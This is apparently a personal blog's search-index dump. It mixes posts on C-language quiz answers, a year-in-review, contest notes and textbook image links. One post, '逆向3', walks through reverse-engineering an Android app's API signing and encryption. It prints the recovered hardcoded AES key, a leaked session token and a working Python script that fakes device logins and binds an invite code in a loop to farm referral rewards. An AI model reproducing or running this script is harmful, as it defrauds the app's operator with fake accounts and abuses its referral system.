答案被吃掉了 (填空题) (1)主函数;main函数;main() (填空题)定义结构数据类型的同时定义结构体变量，称为（ ）定义法。 (1)直接 (填空题) (1)\u0026amp;a、\u0026amp;b、\u0026amp;var、\u0026amp;name[0]~\u0026amp;name[9];\u0026amp;a、\u0026amp;b、\u0026amp;var、\u0026amp;name[0]-\u0026amp;name[9];\u0026amp;a、\u0026amp;b、\u0026amp;var、\u0026amp;name[0]至\u0026amp;name[9] (2)\u0026amp;(a+1)、\u0026amp;5、\u0026amp;name、\u0026amp;i (填空题)所有在函数外部定义的任何变量都属于（ ）变量又称为（ ）变量,在函数内部定义的变量都属于（ ）变量，又叫作（ ）变量。 (1)外部;外部变量;全局变量;全局 (2)全局变量;全局;外部;外部变量 (3)内部;内部变量;局部;局部变量 (4)局部;局部变量;内部;内部变量 (填空题)定义数组K[2][3]={ {3,2,5},{1,0,1} }，请问K[0][ 0]=( )，K[1][2]=（ ）。中间一列的数值是（ ），（ ）对应的数组元素分别是哪几个写出数组元素名（ ）、（ ）。 (1)3 (2)1 (3)2 (4)0 (5)K[0][1] (6)K[1][1] (填空题)定义的结构体数组，其每一个数组元素都是一个（ ）变量。 (1)结构体;结构型 (填空题) (1)声明部分;声明;头文件声明 (2)主函数;main函数;主函数部分 (填空题) (1)structteacher (2)charcno[6]; (3)structteachersta={\u0026ldquo;1101\u0026rdquo;,\u0026ldquo;李晓玲\u0026rdquo;,28,\u0026ldquo;管理工程系\u0026rdquo;}; (4)teacher.cno,teacher.cname,teacher.iage,teacher.cdept (填空题)如果while循环的循环条件表达式为“（ ）”时，该循环将进入死循环。 (1)1 (填空题)指针变量就是专门用来存储（ ）的变量。 (1)地址;数据地址;变量地址 (填空题) (1)地址;变量的地址;数据的地址;一个变量在内存中的地址 (填空题)int iM[5]; 定义的一维数组一共有（ ）个数组变量，第一个数组变量的下标为（ ），最后一个数组变量的下标为（ ）。 (1)5 (2)0 (3)4 (填空题)定义数组K[2][2]={ {1，5}，{3} }，则K[1][1]=（ ）。 (1)0 (填空题)程序填空:输出字符数组中的全部元素,数组中存放的是字符串“windows”长度为7个字符,本题中直接将字符串赋值给字符数组a。#include \u0026ldquo;stdio.h\u0026quot;int main(){ (); //写出定义字符数组a并赋值的命令 char *pa; int i; printf(\u0026quot;\\n\u0026rdquo;); for(i=0;i\u0026lt;=6;i++) (_____); //写出实现字符输出的命令 printf(\u0026quot;\\n\u0026rdquo;);} (1)chara[]=\u0026ldquo;windows\u0026rdquo;;charca[]=\u0026ldquo;windows\u0026rdquo;;chara[7]=\u0026ldquo;windows\u0026rdquo; (2)printf(\u0026quot;%c\u0026quot;,a[i]);printf(\u0026quot;%c\u0026quot;),ca[i];putchar(a[i]);putchar(ca[i]) (填空题)除了（ )循环外，（ ）循环和（ ）都必须在循环体中修改循环变量的值。 (1)for (2)while;dowhile;dowhile;当循环;do循环 (3)dowhile;dowhile;while;当循环;do循环 (填空题) (1)变量 (填空题) (1)\u0026amp;ix (2)\u0026amp;iy (3)ix\u0026gt;iy (填空题)形参是指函数定义时在定义语句中函数名后括号里所表示的参数每个形参由（）和（）构成，形参与形参之间用（）间隔开。 (1)数据类型名;数据类型 (2)变量名;变量 (3)逗号;，;, (填空题)一个C程序中必须有一个主函数，主函数的名字规定为“（ ）”。 (1)main;main() (填空题) (1)chara[]=\u0026ldquo;windows\u0026rdquo;; (2)printf(\u0026quot;%c\u0026quot;,a[i]); (3)printf(\u0026quot;%c\u0026quot;,pa[i]); (4)printf(\u0026quot;%c\u0026quot;,*(a+i)); (5)printf(\u0026quot;%c\u0026quot;,*(pa+i)); (填空题)while循环，当（ ）时才会执行循环体中的命令。 (1)循环条件成立;条件成立 (填空题) (1)变量 (2)数值;数据;数字 (3)计算式;算式 (填空题)C语言程序中的主函数由（ ）和（ ）两部分构成。 (1)主函数定义命令;函数定义命令;函数头 (2)主函数体;函数体 (填空题)程序代码如下,请在空白处填写正确的命令,完善程序。#include \u0026ldquo;stdio.h\u0026quot;int main(){ () //定义结构数组类型“student” { () //定义保存姓名数据的成员cname int imiddle int ifinal; float fave; }; () //定义结构体变量sta并赋值 () //计算总评成绩(平均成绩) printf(\u0026rdquo;(____)\u0026quot;,sta.cname,sta.imiddle,sta.ifinal,sta.fave);//填写正确的输出格式参数} 答案被吃掉了 (填空题) (1)structstudent (2)charcname[8]; (3)structstudentsta={\u0026ldquo;李林玲\u0026rdquo;,80,100}; (4)sta.fave=(sta.imiddle+sta.ifinal)/2.0; (5)%s:%d%d%0.1f (填空题)C程序总是从( )开始执行。 (1)主函数;main函数 (填空题)C语言中，使用嵌套if-else语句来实现（ ）选择结构. (1)多分支 (填空题)先定义结构体数据类型，再用另一条命令定义结构体变量，称为（ )定义法。 (1)间接 (填空题)（ ）变量在所有函数中都有效，可以用于传递参数；（ ）变量只在定义它的函数内有效，函数执行完以后该变量就失效了。 (1)全局;全局变量;外部;外部变量 (2)局部;局部变量;内部;内部变量 (填空题)字符串的结束符为（ )。 (1)\\0;\u0026rsquo;\\0' (填空题)（ ）循环和（ ）循环，循环条件成立时才会执行循环体中的命令。 (1)while;WHILE;当循环;当 (2)for;FOR (填空题)定义一个能保存10个字符的字符数组，数组名为“czf ”，写出正确的命令（ ）。 (1)charczf[10];charczf【10】 (填空题)使用( )函数可以实现字符数组数据的格式化输出。 (1)printf;printf();输出;PRINTF (判断题)数组名就是一个指针变量，他表示数组的首地址。 答案: 对 (判断题)一维数组可以先定义，再给该数组赋值。 答案: 对 (判断题)使用gets（）函数可以从键盘上将字符串一次输入到字符数组中。 答案: 对 (判断题)switch（表达式）中的表达式可以是变量或计算式。 答案: 对 (判断题) 答案: 错 (判断题)要输出二维数组中的值必须使用双重循环来实现。 答案: 对 (判断题)数组中的数据也可以一次将一个数组元素中的值传递给自定义函数进行处理，此时实参的形式为“数组名[下标]”，形参的形式为“数据类型名 变量名”。 答案: 对 (判断题)数组中的数据只能一次将一个数组元素中的值传递给自定义函数进行处理。 答案: 错 (判断题)必须在定义一维数组时给该数组赋初值。 答案: 错 (判断题)使用printf(\u0026quot;%c\u0026quot;,czf)，可以将字符数组czf中的字符串一次输出到屏幕上。 答案: 错 (判断题) 答案: 对 (判断题)scanf 语句可以实现程序运行过程中从键盘上输入数据。 答案: 对 (判断题) 答案: 错 (判断题) 答案: 对 (判断题)%f这个格式输出符用于输出整数型变量的值。 答案: 错 (判断题)如果一次将整个数组传递给自定义函数，在自定义函数中可以对数组中的值进行修改，自定义函数运行结束返回主函数后，数组中保存的是修改后的值。 答案: 对 (判断题) 答案: 错 (判断题)定义结构变量的正确命令格式是：\u0026lt;结构体数据类型名\u0026gt; \u0026lt;结构体变量名\u0026gt;; 答案: 错 (判断题)使用gets（）函数将字符串输入到字符数组中，系统会自动在字符串最后一个字符后面存入一个结束符。 答案: 对 (判断题)定义结构体变量必须先定义结构体数据类型，然后再定义结构变量。 答案: 对 (判断题)如果一次将整个数组中的数据传递给自定义函数,形参变量为“数组名”,实参变量为“数组名[]”的形式。 答案: 错 (判断题)使用结构体变量可以在一个变量中存储多个类型不同的数据。 答案: 对 (判断题)如果一次将整个数组传递到自定义函数,自定义函数中可以对数组中的值进行修改,自定义函数运行结束返回主函数后,数组中保存的是修改后的值。 答案: 对 (判断题)如果一次将整个数组中的数据传递给自定义函数，形参变量为“数组名”，实参变量为“数组名[]”的形式。 答案: 错 (判断题)i++的等价运算式是i=i+1。 答案: 对 "},{"id":94,"href":"/posts/%E6%88%91%E7%9A%842023/","title":"我的2023","section":"Blog","content":"2023年初设下的目标\n考上公办 new 一个对象 学习安卓开发 细数我的2023年，潦潦草草。 上次春节，三天打鱼得看了看复习资料，春节也是过得一塌糊涂。 又到开学，仍是浑浑噩噩。直到考试临近，抱了一下佛脚。 真是惊心动魄啊，考上了，不费吹灰之力便就考上了。 散烂数10日后，我去绵阳兼职了一周的保安，真是遭罪。 后来又到我满18，去了富士康，真是遭罪，期间还学了高数和安卓，真是能干。 回家混到开学，真是无比期待啊，我的大学｛专）时光。 好好学习，真是天天向上捏。 去工作室打听的时候，被老师相中。劝我转去他们专业。 便是苦痛的军训，相当的无聊，且不说，余下一两天的时候，老师让我去打比赛。 又是懒懒散散得赛前预习，得过且过吧。 比赛也是一点都不好玩，且混了一个省三，并报送进了工作室（嘻嘻） 又是帮老师做项目，妈的，且混且混。 年底就到了。。。\n2023的目标完成了2个，余下的2024继续 顺便把今年的目标立下\n拿奖吧，能进国赛最好了 "},{"id":95,"href":"/posts/%E4%BD%A0%E5%A5%BD-ljyh/","title":"你好-ljyh","section":"Blog","content":"\r你好 ljyh\r#\r近来安好\n已进入冬了，你找到温暖了吗？ 该不会今年又会生冻疮吧，那你的英语又有好好学习吗， 不过这些都不是重要的事情，你知道你要做些什么吗。 就这样吧，再见！\nljyh 你好\r#\r好得很嘞\n好冷啊啊啊，可是，真的很冷诶\n别太抽象，应该不会长冻疮吧，我也说不准，但愿不要。 可是，我根本不想学习诶\n琐碎的事情，烦人。 放心吧，那些事情我都记得，但也不一定，捏捏\n为你，千千万万遍\n"},{"id":96,"href":"/posts/%E9%80%86%E5%90%913/","title":"逆向3","section":"Blog","content":"所需工具\n逍遥模拟器 lamda jadx frida 一双手 抓包\r#\r软件有root检测和代理检测，这里不讲绕过。代理不要挂。 安装lamda：\nset HTTPS_PROXY=127.0.0.1:7890 git clone https://github.com/rev1si0n/lamda.git rev1si0n/lamda: ⚡️ Android reverse engineering \u0026amp; automation framework | 史上最强安卓抓包/逆向/HOOK \u0026amp; 云手机/远程桌面/自动化辅助框架，你的工作从未如此简单快捷。\n下载lamda-server-x86_64.tar.gz 以及busybox-x86_64\n先把模拟器的root打开\n# 在你下载好的目录打开终端 adb push lamda-server-x86_64.tar.gz /data/local/tmp adb push busybox-x86_64 /data/local/tmp adb shell # 以下命令都是在adb shell中执行的 su chmod 755 /data/local/tmp/busybox-x86_64 cd /data /data/local/tmp/busybox-x86_64 tar -xzf /data/local/tmp/lamda-server-x86_64.tar.gz rm /data/local/tmp/lamda-server-x864.tar.gz rm /data/local/tmp/busybox-x86_64 启动lamda\n继续上一步结尾\ncd /data/local/tmp/server/bin sh launch.sh 启动完成 ctrl+D退出终端\n在你的lamda目录里打开终端\ncd tools python startmitm.py localhost 启动app，记得关掉root再启动，已经可以抓包了\n逆向\r#\r看看抓包\n一眼盯帧，是有加密，那么，开始逆向吧 工具jadx，把apk拖进去\nX-JSL-API-AUTH\r#\r搜索大法好啊，ctrl+shift+F，直接找关键字 X-JSL-API-AUTH\n只有一处\n有，直接跟进去，v.a.a\nString a = v.a.a(Z.h().u().getPath()); 看到MD5关键字\n参数基本一目了然\n唯一有一个key参数，来自so层，右键这个函数，生成frida hook代码， frida hook不在此展开，多次hook易得key横不变，为 l8N2iooyp07M9IWa\n易得脚本\nX-TOKEN\r#\r搜索，只有一个，按x，交叉引用，诶，找不到 但是，我们继续在上面能找到 f.a(com.niming.weipa.b.a.A, com.niming.weipa.utils.b.b(String.valueOf(jSONObject))); 一句\ncom.niming.weipa.b.a.A就是 X-TOKEN，后面是在加密那坨hashmap 看看加密，AES/ECB/PKCS7Padding，key还是同一个l8N2iooyp07M9IWa DATA\r#\r直接去搜索data的话，肯定会有很多结果，注意到json中有一个handshake参数，大概是恒固定的，去搜索一下v20200429\n只有一个结果，直接定位到加密\n发现是使用的是和上面相同的加密方法 hook一下这个加密方法，看看都加密是些什么东西\n右键这个方法，复制frida 方法，这里不再展开\n邀请好友\r#\rfrom hashlib import md5 import time import requests from Crypto.Cipher import AES from Crypto.Util.Padding import pad, unpad import base64,json import random MODE = AES.MODE_ECB PAD_STYLE = \u0026#39;pkcs7\u0026#39; ENCODING = \u0026#39;UTF-8\u0026#39; key=\u0026#39;l8N2iooyp07M9IWa\u0026#39; url=\u0026#39;http://apichlove.com\u0026#39; def encrypt(plaintext: str, key: str) -\u0026gt; str: key_bytes = key.encode(ENCODING) cipher = AES.new(key_bytes, MODE) plaintext_bytes = plaintext.encode(ENCODING) plaintext_bytes_padded = pad(plaintext_bytes, AES.block_size, PAD_STYLE) ciphertext_bytes = cipher.encrypt(plaintext_bytes_padded) ciphertext_base64_bytes = base64.b64encode(ciphertext_bytes) ciphertext = ciphertext_base64_bytes.decode(ENCODING) return ciphertext def decrypt(ciphertext: str, key: str) -\u0026gt; str: key_bytes = key.encode(ENCODING) decrypter = AES.new(key_bytes, MODE) ciphertext_base64_bytes = ciphertext.encode(ENCODING) ciphertext_bytes = base64.b64decode(ciphertext_base64_bytes) plaintext_bytes_padded = decrypter.decrypt(ciphertext_bytes) plaintext_bytes = unpad(plaintext_bytes_padded, AES.block_size, PAD_STYLE) plaintext = plaintext_bytes.decode(ENCODING) return plaintext def x_t(url): a = [] b = [] # url = \u0026#39;app/api/auth/login/device\u0026#39; v1 = str(int(time.time())) v2 = md5(v1.encode()).hexdigest()[:8] a.append(\u0026#39;md5\u0026#39;) a.append(key) a.append(v1) a.append(v2) a.append(url) v3 = \u0026#39;|\u0026#39;.join(a) v3 = md5(v3.encode()).hexdigest() b.append(\u0026#39;md5\u0026#39;) b.append(v1) b.append(v2) b.append(v3) return \u0026#39;|\u0026#39;.join(b) def getRandom(randomlength=16): digits=\u0026#39;0123456789\u0026#39; ascii_letters=\u0026#39;abcdefghigklmnopqrstuvwxyz\u0026#39; str_list =[random.choice(digits +ascii_letters) for i in range(randomlength)] random_str =\u0026#39;\u0026#39;.join(str_list) return random_str def Token(): device_id=\u0026#39;b2ad30fc-0301-3d50-a97f-\u0026#39;+getRandom(12) data = json.dumps({\u0026#34;channel\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;code\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;device_no\u0026#34;: device_id,\u0026#34;device_type\u0026#34;: \u0026#34;A\u0026#34;, \u0026#34;version\u0026#34;: \u0026#34;1.0.0\u0026#34;}) data={\u0026#39;data\u0026#39;:encrypt(data,key),\u0026#39;handshake\u0026#39;:\u0026#39;v20200429\u0026#39;} header = {\u0026#39;X-JSL-API-AUTH\u0026#39;: x_t(\u0026#39;/app/api/auth/login/device\u0026#39;)} result = requests.post(url+\u0026#39;/app/api/auth/login/device\u0026#39;, json=data, headers=header).json() msg=decrypt(result[\u0026#39;data\u0026#39;],key) # print(msg) return json.loads(msg)[\u0026#39;auth\u0026#39;][\u0026#39;token\u0026#39;],device_id def x_token(device_id,token): Json=json.dumps({\u0026#34;device_no\u0026#34;:device_id,\u0026#34;device_type\u0026#34;:\u0026#34;A\u0026#34;,\u0026#34;token\u0026#34;:token,\u0026#34;version\u0026#34;:\u0026#34;1.0.0\u0026#34;}) return encrypt(Json,key) def parent(code): token,device_id=Token() data={\u0026#39;data\u0026#39;:encrypt(json.dumps({\u0026#39;code\u0026#39;:code}),key),\u0026#39;handshake\u0026#39;:\u0026#39;v20200429\u0026#39;} header={\u0026#39;X-JSL-API-AUTH\u0026#39;:x_t(\u0026#39;/app/api/user/bindcode\u0026#39;),\u0026#39;X-TOKEN\u0026#39;:x_token(device_id=device_id,token=token)} result=requests.post(url+\u0026#39;/app/api/user/bindcode\u0026#39;,json=data,headers=header).json() print(result) print(decrypt(result[\u0026#39;data\u0026#39;],key)) header[\u0026#39;X-JSL-API-AUTH\u0026#39;]=x_t(\u0026#39;/app/api/user/info\u0026#39;) # 你的X-TOKEN # header[\u0026#39;X-TOKEN\u0026#39;]=\u0026#39;4LJnAngoza8TZIz2otKTe52PhqbrW8GULUYVUu87AjDKzXQWPzNCDiHTohcbTWRcJ5V+mdgxrLVskUbLae90njTJJk4bG8tqYcgDX/fhwwG0VkkB11CY0wLhlxPfSkfMSlqmArvVTbrJ7UiydzotGh9nUHVrBqxMbDy9+iuhq9pFmucuV1SRKd/1pGxDNI0UX9nA5mpYMfYih0N/vR3A6+AdHQASRqBpeXSfMj3M7fHY/5W4fj0esNHkw93KjsnWM2FJWdNCYrkZC3tHWipUqKTk7zvbx20zaWo/c78VuePh8OeiCV2Htt9ah8+MNvAu+o6TERNF13aavGJkxeptaZs/+PFbBa397NVD4zQ28QDhkuOthPwHbpvOL/cWm9rjoL7TH7BdKGqjbYzHTvUnpWHQtJhGTPXRdNdSklDv4UDW/nsKTVVcv1LQAU1Oo5EnMwfZF2wmTtIRMRTPIi9zYFVhTYlJeFroe2fWrl8H9afzxz+fP+tm5aGSa7Ll0RBitPmN364On3xaWrRIiYGvfYsqckb6+BRQyDMXI+nHUMOAR2EcT6U3BMUCN5VJnkX8atWL76jdqPlFZzS9zyo5yaeiNLnQzVYm9wxNPuzb9ZMgvRQ4TnXfBGE5t8BiE4jAPJczvQhvWseHNy3M3wCd5b7CavKAVznoovCoLaqJpRX+bOWnttUWMLqdYxBnweL3\u0026#39; # result=requests.post(url+\u0026#39;/app/api/user/info\u0026#39;,data=\u0026#39;{\u0026#34;handshake\u0026#34;:\u0026#34;v20200429\u0026#34;}\u0026#39;,headers=header).json() # print(json.loads(decrypt(result[\u0026#39;data\u0026#39;],key))[\u0026#39;vip_expired\u0026#39;]) # 邀请码 for i in range(5): parent(\u0026#39;RWK6IF\u0026#39;) "},{"id":97,"href":"/posts/%E6%88%91%E8%A6%81%E5%8E%BB%E6%AF%94%E8%B5%9B%E4%BA%86/","title":"我要去比赛了","section":"Blog","content":"如题，去达州，臭傻逼移动开发，抄你妈还内网，让不让人玩了。但是学校公费，嘻嘻嘻，但是明天就要去了，只能抱抱佛脚了。\n更新\r#\rwuwuwu，怎么都是牛马啊，还好我也是木流牛马\n"},{"id":98,"href":"/posts/%E7%95%85%E9%80%9A%E8%8B%B1%E8%AF%AD-%E5%85%A8%E4%B9%A6-%E9%AB%98%E6%B8%85%E5%9B%BE%E7%89%87%E9%93%BE%E6%8E%A5/","title":"畅通英语-全书-高清图片链接","section":"Blog","content":"\r1 Window on the world\r#\rhttps://cdn-img.daxuesoutijiang.com/bookimg/dxbook_6a4a6879d044476e5e8b8dca3b2d3d3e.jpg https://cdn-img.daxuesoutijiang.com/bookimg/dxbook_6a4a6879d044476e5e8b8dca3b2d3d3e.jpg https://cdn-img.daxuesoutijiang.com/bookimg/dxbook_cfcebfe3982773d77f165a7aad013795.jpg https://cdn-img.daxuesoutijiang.com/bookimg/dxbook_d70378eac179796d98f27c00226636bc.jpg https://cdn-img.daxuesoutijiang.com/bookimg/dxbook_00bb3ee963b35c3ad84fcc6f0d999ab4.jpg https://cdn-img.daxuesoutijiang.com/bookimg/dxbook_02f55083340252cdb336e463b19da074.jpg https://cdn-img.daxuesoutijiang.com/bookimg/dxbook_f5faef8777663b8a455031c46596c667.jpg\n2 How strange!\r#\rhttps://cdn-img.daxuesoutijiang.com/bookimg/dxbook_8dbbb37e5acf8fb28e00a4b0e150bcf2.jpg https://cdn-img.daxuesoutijiang.com/bookimg/dxbook_0e671baa1820f5e8d3526dbed632a32a.jpg https://cdn-img.daxuesoutijiang.com/bookimg/dxbook_c2458506b07dfa9bd243cefdbdded6f0.jpg https://cdn-img.daxuesoutijiang.com/bookimg/dxbook_04a544b2c68c32aa5b13f175591b10c0.jpg https://cdn-img.daxuesoutijiang.com/bookimg/dxbook_c0185575a25d4766145d5f15df4ac717.jpg https://cdn-img.daxuesoutijiang.com/bookimg/dxbook_f65b7a6bdbca10b14cb65a081b11973e.jpg\n3 Food for thought\r#\rhttps://cdn-img.daxuesoutijiang.com/bookimg/dxbook_8e9b180dfd3d0daaca955f18f3552743.jpg https://cdn-img.daxuesoutijiang.com/bookimg/dxbook_663bd570f1176ebc0ae51eb820a3f5d5.jpg https://cdn-img.daxuesoutijiang.com/bookimg/dxbook_e0605f1cffdbcbb01a8918fc93d8384c.jpg https://cdn-img.daxuesoutijiang.com/bookimg/dxbook_4d11bd07e376481181bf7d5f56795d1a.jpg https://cdn-img.daxuesoutijiang.com/bookimg/dxbook_800d933e1d96e620ccad24132ad30d31.jpg https://cdn-img.daxuesoutijiang.com/bookimg/dxbook_c1b8d426f2c5af496c7c8b953d802605.jpg\n4 Time on your hands\r#\rhttps://cdn-img.daxuesoutijiang.com/bookimg/dxbook_e09ded62d955d7332d51961787a56914.jpg https://cdn-img.daxuesoutijiang.com/bookimg/dxbook_a05493968877474546fddfee853311fd.jpg https://cdn-img.daxuesoutijiang.com/bookimg/dxbook_2a8fd2d2378d81e6d49179fd7151cfd1.jpg https://cdn-img.daxuesoutijiang.com/bookimg/dxbook_c57ecf7de2303ad095a49ddf1e6e3e9d.jpg https://cdn-img.daxuesoutijiang.com/bookimg/dxbook_5d39ad3ba3ee1a1b2b02dc75f9c9d8bd.jpg https://cdn-img.daxuesoutijiang.com/bookimg/dxbook_54f3c6b22d53b01f4d1ef347e20b718a.jpg\nRevision: Units 1-4\r#\rhttps://cdn-img.daxuesoutijiang.com/bookimg/dxbook_2e8b3ad339018af7ec60a9a0cc3d856f.jpg https://cdn-img.daxuesoutijiang.com/bookimg/dxbook_bf3c879a12c3178f38098ee8de08a591.jpg\nTask 1\r#\rhttps://cdn-img.daxuesoutijiang.com/bookimg/dxbook_f6a72be9a167613e890249033776688b.jpg https://cdn-img.daxuesoutijiang.com/bookimg/dxbook_0edf76cc39301b3794296164fbcd165f.jpg\n5 Get the message\r#\rhttps://cdn-img.daxuesoutijiang.com/bookimg/dxbook_294783f669619e10e0d596915475b4a8.jpg https://cdn-img.daxuesoutijiang.com/bookimg/dxbook_8883ef4da4ef5f4da019c2d3b20266da.jpg https://cdn-img.daxuesoutijiang.com/bookimg/dxbook_9df3633fcf31645119b4d1d8cc24a351.jpg https://cdn-img.daxuesoutijiang.com/bookimg/dxbook_5524681e7db9deaea988bda83a2b5cde.jpg https://cdn-img.daxuesoutijiang.com/bookimg/dxbook_47c4c36472a69e1c75a7654fc8b88b70.jpg https://cdn-img.daxuesoutijiang.com/bookimg/dxbook_01b5cb599e072e7639c64e4a3ec35e9c.jpg\n6 Urban life\r#\rhttps://cdn-img.daxuesoutijiang.com/bookimg/dxbook_a839bceb070cb37c8cdc9d9b714cd7c0.jpg https://cdn-img.daxuesoutijiang.com/bookimg/dxbook_ca3d27042b9827364f06c4a26925b809.jpg https://cdn-img.daxuesoutijiang.com/bookimg/dxbook_2529970249a5245574d637bb80ac604e.jpg https://cdn-img.daxuesoutijiang.com/bookimg/dxbook_da5b63d91463a5ada0ba0a9e124f407e.jpg https://cdn-img.daxuesoutijiang.com/bookimg/dxbook_fb4c6ac72ba019c4ecd53dbcf972e4b9.jpg https://cdn-img.daxuesoutijiang.com/bookimg/dxbook_9a79ab7fe2c469fb90750ff2f8db78f5.jpg\n7 Bon voyage!\r#\rhttps://cdn-img.daxuesoutijiang.com/bookimg/dxbook_5a5c49ff35a48c840911c20f23acfe62.jpg https://cdn-img.daxuesoutijiang.com/bookimg/dxbook_98af71a8585c19d1a6e596269aa18c82.jpg https://cdn-img.daxuesoutijiang.com/bookimg/dxbook_f1fdb683e1b5606e86c7d95882f8743e.jpg https://cdn-img.daxuesoutijiang.com/bookimg/dxbook_2e4e53b66b737bbdf666c536ef545757.jpg https://cdn-img.daxuesoutijiang.com/bookimg/dxbook_0e3df56587cf506be321158c1f5cd4ba.jpg https://cdn-img.daxuesoutijiang.com/bookimg/dxbook_54c6178e87aecec61c0c4e0f33463bd0.jpg\n8 Down to earth\r#\rhttps://cdn-img.daxuesoutijiang.com/bookimg/dxbook_259d3c7c44758f2f623df0e9a11458df.jpg https://cdn-img.daxuesoutijiang.com/bookimg/dxbook_de442cf6a05153062dfe975bd4a7fc0b.jpg https://cdn-img.daxuesoutijiang.com/bookimg/dxbook_590da7d36b59ad93b6582c6335d70b6c.jpg https://cdn-img.daxuesoutijiang.com/bookimg/dxbook_446fe508cc53e6a179589f1c5fa85ed3.jpg https://cdn-img.daxuesoutijiang.com/bookimg/dxbook_2eeb7fd5d6d2a5f27b1dbc97389ca3f6.jpg https://cdn-img.daxuesoutijiang.com/bookimg/dxbook_5af1b7c69b9ba723d9af0e1bb0d06b47.jpg\nRevision: Units 5-8\r#\rhttps://cdn-img.daxuesoutijiang.com/bookimg/dxbook_f705338dfeb468588f19e6e3e198e33f.jpg https://cdn-img.daxuesoutijiang.com/bookimg/dxbook_87acf8b4abe89f9d6507d9f0667aa62f.jpg\nTask 2\r#\rhttps://cdn-img.daxuesoutijiang.com/bookimg/dxbook_282433e07eb4951873dcf1eace9a4a9b.jpg https://cdn-img.daxuesoutijiang.com/bookimg/dxbook_cfc106ae91904e45daecbdc62bbe7fd0.jpg\n9 Cash in hand\r#\rhttps://cdn-img.daxuesoutijiang.com/bookimg/dxbook_207cf854078b614031589b2e25a1a7b9.jpg https://cdn-img.daxuesoutijiang.com/bookimg/dxbook_bc9929343e7f76c6594a2e5ef417b93e.jpg https://cdn-img.daxuesoutijiang.com/bookimg/dxbook_355a960e2c80cf857cd6d4a4cfccf5e6.jpg https://cdn-img.daxuesoutijiang.com/bookimg/dxbook_5a2c1fdc25761825df2ffdcdc0e07f5a.jpg https://cdn-img.daxuesoutijiang.com/bookimg/dxbook_231e6d56dc6fd09f1484baca03698f13.jpg https://cdn-img.daxuesoutijiang.com/bookimg/dxbook_5837ac6e61687d7b243fecb759d40342.jpg\n10 Oldies but goodies\r#\rhttps://cdn-img.daxuesoutijiang.com/bookimg/dxbook_bcbb44c01875348c0aaf497c0d29a27a.jpg https://cdn-img.daxuesoutijiang.com/bookimg/dxbook_f5e3e44ec74bc6c0b692184d20ae7249.jpg https://cdn-img.daxuesoutijiang.com/bookimg/dxbook_3d0846b61661839c013a236f2574fce3.jpg https://cdn-img.daxuesoutijiang.com/bookimg/dxbook_9df0d8e1b4fb7be112b3d192fd69e4cf.jpg https://cdn-img.daxuesoutijiang.com/bookimg/dxbook_87c0b0ed34f8190fbb4749bd43f91391.jpg https://cdn-img.daxuesoutijiang.com/bookimg/dxbook_8df423090ecd4641310c1100ce011e03.jpg\n11 A good sport\r#\rhttps://cdn-img.daxuesoutijiang.com/bookimg/dxbook_86ffeccc6498f4d13a1a71e8bb561ef1.jpg https://cdn-img.daxuesoutijiang.com/bookimg/dxbook_854eb38df225ceeaac6466287f894f30.jpg https://cdn-img.daxuesoutijiang.com/bookimg/dxbook_fffd056ad758ae0b731759d3c81f3276.jpg https://cdn-img.daxuesoutijiang.com/bookimg/dxbook_4e9c16840ff9c2a4a946502e73b78a7e.jpg https://cdn-img.daxuesoutijiang.com/bookimg/dxbook_6210993195ff6499ee30b6a707db7486.jpg https://cdn-img.daxuesoutijiang.com/bookimg/dxbook_20621a3313f2deef6305bf6f5e5c5891.jpg\n12 Working your way\r#\rhttps://cdn-img.daxuesoutijiang.com/bookimg/dxbook_c8b7e6086e1642fe842365b933623b03.jpg https://cdn-img.daxuesoutijiang.com/bookimg/dxbook_5b247318343a534f7378c5726b65f712.jpg https://cdn-img.daxuesoutijiang.com/bookimg/dxbook_b3e4e6b2e9b4b8d82b724242cf5a2e5d.jpg https://cdn-img.daxuesoutijiang.com/bookimg/dxbook_5ce5cb7c5051ec2aee44b6eec4d06338.jpg https://cdn-img.daxuesoutijiang.com/bookimg/dxbook_ba2ecb06d93b97de11ffd565ea108a85.jpg https://cdn-img.daxuesoutijiang.com/bookimg/dxbook_be4a661c42859de4e64dcc63d16b13c4.jpg\nRevision: Units 9-12\r#\rhttps://cdn-img.daxuesoutijiang.com/bookimg/dxbook_a5da7159398ff13f7fcb23c4256304ad.jpg https://cdn-img.daxuesoutijiang.com/bookimg/dxbook_35fd02a0e3ec4f5f6adbffa8abc12f79.jpg\nTask 3\r#\rhttps://cdn-img.daxuesoutijiang.com/bookimg/dxbook_04225fb901103592b1d55cb9c32cf695.jpg https://cdn-img.daxuesoutijiang.com/bookimg/dxbook_3527c56bdce68a539a29e8fac9809193.jpg\n13 Health matters\r#\rhttps://cdn-img.daxuesoutijiang.com/bookimg/dxbook_1f8e385f5b54e0b7a4cef805c1a83144.jpg https://cdn-img.daxuesoutijiang.com/bookimg/dxbook_5f1ebd6951b070e7f6e4e9ef36799469.jpg https://cdn-img.daxuesoutijiang.com/bookimg/dxbook_c84fdfdbecb83760ff137fe2697c8c12.jpg https://cdn-img.daxuesoutijiang.com/bookimg/dxbook_f8f8403000e5b8a49a40c093f46ad646.jpg https://cdn-img.daxuesoutijiang.com/bookimg/dxbook_08e4d80ee0a6da548c29bf30ddca0179.jpg https://cdn-img.daxuesoutijiang.com/bookimg/dxbook_78ce7882973771dbc3c1f7e638bdbb25.jpg\n14 In person\r#\rhttps://cdn-img.daxuesoutijiang.com/bookimg/dxbook_ca6b950ddfbde92532737ed250dc14fe.jpg https://cdn-img.daxuesoutijiang.com/bookimg/dxbook_1d3d6ef260d784f07a8d3ba8e5df1ec7.jpg https://cdn-img.daxuesoutijiang.com/bookimg/dxbook_0a82477ddfe22945b20f8a76388ecac8.jpg https://cdn-img.daxuesoutijiang.com/bookimg/dxbook_0bfff8b1baf745accc126c102f276299.jpg https://cdn-img.daxuesoutijiang.com/bookimg/dxbook_89c7782e124530be78e96b1c4c40aef7.jpg https://cdn-img.daxuesoutijiang.com/bookimg/dxbook_19467d867c22b5d54a95165508981d8e.jpg\n15 Watch out!\r#\rhttps://cdn-img.daxuesoutijiang.com/bookimg/dxbook_c00a30c60423cfc1fce7827cdcf8a4ac.jpg https://cdn-img.daxuesoutijiang.com/bookimg/dxbook_d379f99304d2d869a223835324799ea0.jpg https://cdn-img.daxuesoutijiang.com/bookimg/dxbook_f5f43625c7c3ada15b9240bc6d6e5f13.jpg https://cdn-img.daxuesoutijiang.com/bookimg/dxbook_20487bbf0fde2a69d4e559a2a42505e2.jpg https://cdn-img.daxuesoutijiang.com/bookimg/dxbook_b87a21adf5b52684de9c1246cf0a6ae9.jpg 